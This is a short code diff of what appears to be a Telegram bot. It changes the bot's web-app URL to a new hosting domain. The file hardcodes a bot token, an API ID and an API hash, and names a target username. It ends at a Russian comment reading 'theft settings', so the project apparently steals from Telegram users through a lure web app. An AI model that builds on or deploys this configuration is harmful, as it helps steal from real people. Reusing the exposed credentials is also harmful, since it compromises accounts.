@@ -11,7 +11,7 @@ const BOT_TOKEN = process.env.BOT_TOKEN || '8319103126:AAGvA6pmIIbgwqFE8SUUw3r-M
 const API_ID = parseInt(process.env.API_ID) || 30427944;
 const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
 const MY_USER_ID = 1398396668;
-const WEB_APP_URL = 'https://eeee-onlinep1.replit.app';
+const WEB_APP_URL = 'https://eeee-8hslra.fly.dev/';
 const TARGET_USERNAME = 'NikLaStore';
 
 // 🔧 НАСТРОЙКИ КРАЖИ
